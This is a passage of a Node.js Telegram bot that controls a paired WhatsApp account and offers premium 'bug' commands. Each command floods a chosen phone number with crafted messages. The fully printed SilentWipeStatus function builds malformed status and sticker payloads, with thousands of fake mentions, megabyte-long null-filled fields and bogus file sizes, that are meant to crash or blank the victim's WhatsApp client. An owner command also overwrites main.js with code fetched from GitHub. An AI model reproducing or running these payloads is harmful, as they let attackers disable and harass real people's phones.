    const photo = ctx.message.reply_to_message.photo;
    const fileId = photo[photo.length - 1].file_id;
    const file = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    // Download foto ke buffer
    const response = await fetch(fileUrl);
    const buffer = Buffer.from(await response.arrayBuffer());

    // Upload ke PicWish API
    const form = new FormData();
    form.append("image_file", buffer, { filename: "image.jpg" });
    form.append("type", "clean"); // "clean" = umum, "face" = wajah
    form.append("scale_factor", "4"); // 4 = 4x lebih besar

    const upscaleRes = await fetch("https://api.picwish.com/v1/photo-enhancer", {
      method: "POST",
      body: form,
    });

    const result = await upscaleRes.json();
    if (!result.image_url) throw new Error();

    // Kirim hasil
    await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id);
    await ctx.replyWithPhoto(result.image_url, {
      caption: "✅ *Foto berhasil ditingkatkan kualitasnya!*",
    });
  } catch (err) {
    console.error("HD Error:", err);
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      "❌ Gagal memproses foto. Coba foto lain atau coba lagi nanti."
    );
  }
});
// ================= DELAY ================= //
const delay = (ms) =>
  new Promise(resolve => setTimeout(resolve, ms));

// ================= LIST BOT ================= //
const botList = [];
const pendingPairing = new Set();

// ================= CONNECT ================= //
bot.command("connect", checkOwner, async (ctx) => {
  try {

    const q = ctx.message.text.split(" ")[1];

    // ================= INPUT CHECK ================= //
    if (!q) {
      return ctx.reply(
`
<blockquote><b>🪧 𝙴𝚇𝙰𝙼𝙿𝙻𝙴</b></blockquote>
<code>/connect 628xxx</code>
`,
{ parse_mode: "HTML" }
      );
    }

    let phoneNumber = q.replace(/[^0-9]/g, "");

    // ================= FORMAT NUMBER ================= //
    if (phoneNumber.startsWith("08")) {
      phoneNumber = "62" + phoneNumber.slice(1);
    }

    // ================= VALID NUMBER ================= //
    if (
      phoneNumber.length < 8 ||
      phoneNumber.length > 15
    ) {
      return ctx.reply(
`
<blockquote><b>❌ 𝙽𝚄𝙼𝙱𝙴𝚁 𝙸𝙽𝚅𝙰𝙻𝙸𝙳</b></blockquote>
⌬ Gunakan nomor dengan kode negara
⌬ Example : 628xxx
`,
{ parse_mode: "HTML" }
      );
    }

    // ================= PENDING CHECK ================= //
    if (pendingPairing.has(phoneNumber)) {
      return ctx.reply(
`
<blockquote><b>⚠️ 𝙿𝙰𝙸𝚁𝙸𝙽𝙶 𝙿𝙴𝙽𝙳𝙸𝙽𝙶</b></blockquote>
⌬ Target : ${phoneNumber}
⌬ Status : Waiting Process
`,
{ parse_mode: "HTML" }
      );
    }

    pendingPairing.add(phoneNumber);

    // ================= DELAY ================= //
    await delay(5000);

    try {
      await sock.sendPresenceUpdate("available");
    } catch {}

    await delay(3000);

    // ================= REQUEST CODE ================= //
    const code =
      await sock.requestPairingCode(phoneNumber);

    // ================= FAILED ================= //
    if (!code) {

      pendingPairing.delete(phoneNumber);

      return ctx.reply(
`
<blockquote><b>❌ 𝙵𝙰𝙸𝙻𝙴𝙳 𝚁𝙴𝚀𝚄𝙴𝚂𝚃</b></blockquote>
⌬ Target : ${phoneNumber}
⌬ Status : Failed Get Pairing
`,
{ parse_mode: "HTML" }
      );
    }

    const formattedCode =
      code.match(/.{1,4}/g)?.join("-") || code;

    // ================= SAVE BOT ================= //
    if (!botList.includes(phoneNumber)) {
      botList.push(phoneNumber);
    }

    // ================= SEND RESULT ================= //
    await ctx.replyWithPhoto(
      "https://files.catbox.moe/j0mmhf.jpg",
      {
        caption:
`
<blockquote><b>ℝ𝔼ℚ𝕌𝔼𝕊𝕋 ℙ𝔸𝕀ℝ𝕀ℕ𝔾 ℕ𝕌𝕄𝔹𝔼ℝ</b></blockquote>
⌬ Target Number : ${phoneNumber}
⌬ Pairing Code : ${formattedCode}
⌬ Status : Success Request

<blockquote>
☛ Silahkan masukkan kode pairing tersebut melalui notifikasi WhatsApp untuk menautkan perangkat kedalam bot.
</blockquote>
`,
        parse_mode: "HTML"
      }
    );

    // ================= AUTO CLEAR ================= //
    setTimeout(() => {
      pendingPairing.delete(phoneNumber);
    }, 60000);

  } catch (err) {

    console.log("Connect Error :", err);

    pendingPairing.clear();

    ctx.reply(
`
<blockquote><b>❌ 𝚂𝚈𝚂𝚃𝙴𝙼 𝙴𝚁𝚁𝙾𝚁</b></blockquote>
⌬ Status : Failed Execute
⌬ Type : Connect System
`,
{ parse_mode: "HTML" }
    );

  }
});

// ================= LIST BOT ================= //
bot.command("listbot", checkOwner, async (ctx) => {

  if (botList.length < 1) {
    return ctx.reply(
`
<blockquote><b>❌ 𝙻𝙸𝚂𝚃 𝙱𝙾𝚃 𝙴𝙼𝙿𝚃𝚈</b></blockquote>

⌬ Status : No Connected Bot
`,
{ parse_mode: "HTML" }
    );
  }

  let teks =
`
<blockquote><b>📦 𝙻𝙸𝚂𝚃 𝙲𝙾𝙽𝙽𝙴𝙲𝚃 𝙱𝙾𝚃</b></blockquote>

`;

  botList.forEach((num, i) => {
    teks += `⌬ ${i + 1}. ${num}\n`;
  });

  teks +=
`

<blockquote>⌬ Total Connected : ${botList.length}
</blockquote>
`;

  ctx.reply(teks, {
    parse_mode: "HTML"
  });

});

let isUpdating = false; 

bot.command("pullupdate", async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Akses hanya untuk pemilik");
  }

  // Anti spam update
  if (isUpdating) {
    return ctx.reply("⏳ Update sedang berjalan...");
  }

  isUpdating = true;

  const UPDATE_FILE = "main.js";
  const UPDATE_URL = "https://raw.githubusercontent.com/GyzkxT/AutoUpdateBaseAkaozik/refs/heads/main/main.js";
  const UPDATE_PATH = `./${UPDATE_FILE}`;

  await ctx.reply(
    `⏳ <b>Auto Update Script...</b>\n<blockquote>Mohon tunggu beberapa saat, bot sedang mengambil file terbaru.</blockquote>`,
    { parse_mode: "HTML" }
  );

  try {
    await new Promise((resolve, reject) => {
      const file = fs.createWriteStream(UPDATE_PATH);
      https.get(UPDATE_URL, (response) => {
        if (response.statusCode !== 200) {
          return reject(new Error(`HTTP ${response.statusCode}`));
        }
        response.pipe(file);
        file.on("finish", () => {
          file.close(resolve);
        });
      }).on("error", (err) => {
        fs.unlink(UPDATE_PATH, () => {});
        reject(err);
      });
    });

    await ctx.reply(
      `✅ <b>Update berhasil!</b>\n🧩 Ditemukan file <b>main.js</b>\n♻ Restarting bot...`,
      { parse_mode: "HTML" }
    );

    setTimeout(() => {
      process.exit(0);
    }, 2500);
  } catch (e) {
    console.error(e);
    await ctx.reply(
      `❌ <b>Gagal update.</b>\n<blockquote><code>${String(e.message || e)}</code></blockquote>`,
      { parse_mode: "HTML" }
    );
  } finally {
    isUpdating = false;
  }
});

// ================= KILL SESSION ================= //
bot.command("killsesi", checkOwner, async (ctx) => {
  try {
    if (sock) {
      try {
        await sock.logout();
      } catch {}
      sock = null;
    }

    const deleted = deleteSession();
    global.pairingMessage = null;

    if (deleted) {
      ctx.reply("🗑️ Session berhasil dihapus, Silahkan ketik /restart lalu setelah itu /connect kembali untuk menghubungkan Sender atau Bot");
    } else {
      ctx.reply("⚠️ Session tidak ditemukan");
    }

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Gagal hapus session ketik /restart lalu setelah itu killsesi kembali");
  }
});
/// CASE BUG 1 \\\
bot.command(
  "Cyzx",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /Cyzx 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`
<blockquote><b>ÄKÄÖZÌK ÌñVÌÇ₮Ú§</b></blockquote>
<b>Bug sent to target:</b> ${q}
<b>Eksekusi Bug By:</b> ${username}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Çêk ☇ ₮årgê₮",
                url: `https://wa.me/${q}`,
                style: "primary"
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 150; i++) {
        console.log(
          chalk.yellow(`[ PROGRES ] MENGIRIM BUG TO ${q}`)
        );
        await SilentWipeStatus(sock, target);
        await sleep(5000);
      }
    })();

  }
);
/// CASE BUG 1 \\\
bot.command(
  "xinvisible",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /xinvisible 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`
<blockquote><b>ÄKÄÖZÌK ÌñVÌÇ₮Ú§</b></blockquote>
<b>Bug sent to target:</b> ${q}
<b>Eksekusi Bug By:</b> ${username}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`,
                style: "primary"
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 1; i++) {
        console.log(
          chalk.yellow(`PROSES MENGIRIM BUG TO ${q}`)
        );
        await VnXNewDenglayHardInpis(sock, target);
        await sleep(1500);
      }
    })();

  }
);
/// CASE BUG 1 \\\
bot.command(
  "ghostdelay",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /ghostdelay 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`
<blockquote><b>ÄKÄÖZÌK ÌñVÌÇ₮Ú§</b></blockquote>
<b>Bug sent to target:</b> ${q}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`,
                style: "danger"
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 1; i++) {
        console.log(
          chalk.yellow(`PROSES MENGIRIM BUG ${i + 1} TO ${q}`)
        );
        await VnXNewDenglayHardInpis(sock, target);
        await sleep(500);
      }
    })();

  }
);
/// CASE BUG 1 \\\
bot.command(
  "xglitch",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /xglitch 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`
<blockquote><b>ÄKÄÖZÌK ÌñVÌÇ₮Ú§</b></blockquote>
<b>Bug sent to target:</b> ${q}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`,
                style: "success"
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 5; i++) {
        console.log(
          chalk.yellow(`PROSES MENGIRIM BUG ${i + 1} TO ${q}`)
        );
        await VnXNewDenglayHardInpis(sock, target);
        await sleep(1000);
      }
    })();

  }
);
/// CASE BUG 1 \\\
bot.command(
  "zxcv",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /zxcv 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`
<blockquote><b>ÄKÄÖZÌK ÌñVÌÇ₮Ú§</b></blockquote>
<b>ZXCV bug sent to target:</b> ${q}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`,
                style: "danger"
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 5; i++) {
        console.log(
          chalk.yellow(`PROSES MENGIRIM BUG ${i + 1} TO ${q}`)
        );
        await VnXNewSpamNotifToDelayInvisV2(sock, target);
        await sleep(1000);
      }
    })();

  }
);
/// CASE BUG 1 \\\
bot.command(
  "xnovas",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /xnovas 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`
<blockquote><b>ÄKÄÖZÌK ÌñVÌÇ₮Ú§</b></blockquote>
<b>XNOVAS bug sent to target:</b> ${q}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`,
                style: "success"
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 1; i++) {
        console.log(
          chalk.yellow(`PROSES MENGIRIM BUG ${i + 1} TO ${q}`)
        );
        await BulldozerByDharzy(sock, target);
        await sleep(1500);
      }
    })();

  }
);
/// CASE BUG 1 \\\
bot.command(
  "iphns",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /iphns 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`
<blockquote><b>ÄKÄÖZÌK ÌñVÌÇ₮Ú§</b></blockquote>
<b>IPHNS bug sent to target:</b> ${q}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`,
                style: "danger"
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 5; i++) {
        console.log(
          chalk.yellow(`PROSES MENGIRIM BUG IOS TO ${q}`)
        );
        await InvisibleIOS(sock, target);
        await sleep(1500);
      }
    })();

  }
);
/// CASE BUG 1 \\\
bot.command(
  "blankphone",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /blankphone 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`
<blockquote><b>ÄKÄÖZÌK ÌñVÌÇ₮Ú§</b></blockquote>
<b>Bug sent to</b> ${q}
<b>Type</b> Visible Bugs
<b>Effect</b> BLANK ANDROID`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 15; i++) {
        console.log(
          chalk.yellow(`PROSES MENGIRIM BUG ${i + 1} TO ${q}`)
        );
        await VnXNewBlankPyment(sock, target);
        await sleep(1500);
      }
    })();

  }
);
/// CASE BUG 1 \\\
bot.command(
  "xnotif",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /xnotif 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`
<blockquote><b>ÄKÄÖZÌK ÌñVÌÇ₮Ú§</b></blockquote>
<b>Bug sent to:</b> ${q}
<b>Type:</b> Visible Bugs
<b>Effect:</b> SPAM NOTIFIKASI`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
                url: `https://wa.me/${q}`
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 20; i++) {
        console.log(
          chalk.yellow(`PROSES MENGIRIM BUG ${i + 1} TO ${q}`)
        );
        await VnXNewblankNotif(sock, target);
        await sleep(3000);
      }
    })();

  }
);
// ------------ (  FUNCTION BUGS ) -------------- \\

async function SilentWipeStatus(sock, target) {
  const GhostPayload = [
    {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1995 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              ],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593,
            },
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
          },
        },
      },
    },
    {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/webp",
            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
            fileLength: "1173741824",
            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
            mediaKeyTimestamp: "1743225419",
            isAnimated: false,
            viewOnce: false,
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 1995 }, () => "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              ],
              isSampled: true,
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 9999,
              isForwarded: true,
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: { text: "", format: "DEFAULT" },
                      nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3,
                      },
                    },
                  },
                },
              },
            },
          },
        },
      },
    },
    {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
        mimetype: "image/jpeg",
        caption: " X ",
        fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
        fileLength: "149502",
        height: 1397,
        width: 1126,
        mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
        fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
        directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1777621571",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJCR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFL/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIhEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFCR/9oACAEBAAE/AP7FNnt/Pj//2Q==",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          isQuestion: true
        },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        scanLengths: [
          2560752640,
          2478045696,
          578944000,
          3047881856
        ],
        midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
      }
    }
  ];

  const GhostPayload2 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "X", 
            format: "EXTENTION_1" 
          },
          nativeFlowResponseMessage: {
            name: "address_message", 
            paramsJson: `{\"display_text\":\"${" ".repeat(1000000)}\",\"id\":\".zer0x\",\"description\":\"Xwrcvzz.\"}`, 
            version: 3
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, z) => `1313555020${z + 1}@s.whatsapp.net`), 
            statusAttributionType: "SHARED_FROM_MENTION",
          }, 
        }
      }
    }
  };

  for (const a of GhostPayload) {
    await sock.relayMessage("status@broadcast", a, {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { status_setting: "contacts" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: [],
                },
              ],
            },
          ],
        },
      ],
    });
  }

  await sock.relayMessage("status@broadcast", GhostPayload2, {
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: { status_setting: "contacts" },
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: [],
              },
            ],
          },
        ],
      },
    ],
  });
  console.log("succes send bug");
}

// ━━━〔 SISTEM MEMJALANKAN - BOT  〕━━━ //

(async () => {
  try {
    console.clear();

    const startTime = Date.now();

    const color = (c, t) => `\x1b[${c}m${t}\x1b[0m`;
    const cyan = (t) => color(36, t);
    const green = (t) => color(32, t);
    const red = (t) => color(31, t);
    const yellow = (t) => color(33, t);
    const dim = (t) => color(2, t);

    const line = "════════════════════════════════════";

    const printBox = (title) => {
      console.log(`
╔${line}╗
║   ${title.padEnd(30, " ")}   ║
╚${line}╝
`);
    };

    const logStep = (msg) => console.log(cyan(`➤ ${msg}`));
    const logOk = (label, msg) =>
      console.log(green(`✔ ${label.padEnd(12)} : ${msg}`));

    printBox("⚡ ÄKÄÖZÌK ÌñVÌÇ₮Ú§  SCRIPT");

    console.log(dim("System initializing...\n"));

    currentMode = getMode();
    logOk("Mode", currentMode);

    logStep("Connecting WhatsApp...");
    await startSesi();
    logOk("WhatsApp", "Connected");

    logStep("Starting Telegram bot...");
    await bot.launch();
    logOk("Telegram", "Active");

    process.once("SIGINT", () => {
      console.log(red("\n🛑 SIGINT → Shutdown initiated"));
      bot.stop("SIGINT");
    });

    process.once("SIGTERM", () => {
      console.log(red("\n🛑 SIGTERM → Shutdown initiated"));
      bot.stop("SIGTERM");
    });

    const uptime = ((Date.now() - startTime) / 1000).toFixed(2);

    console.log(`
╔${line}╗
║        🟢 SYSTEM ONLINE          ║
╠${line}╣
║ ⏱️ Uptime   : ${uptime}s
║ 🔐 Status   : SECURE
║ ⚙️ Engine   : RUNNING
╚${line}╝
`);

  } catch (err) {
    console.clear();

    const red = (t) => `\x1b[31m${t}\x1b[0m`;
    const yellow = (t) => `\x1b[33m${t}\x1b[0m`;

    console.log(`
╔════════════════════════════════════╗
║          ❌ SYSTEM ERROR          ║
╚════════════════════════════════════╝
`);

    console.log(red("⚠️ Unexpected failure:\n"));
    console.error(err);

    setTimeout(() => {
      console.log(yellow("\n🔄 Restarting system..."));
      process.exit(1);
    }, 3000);
  }
})();
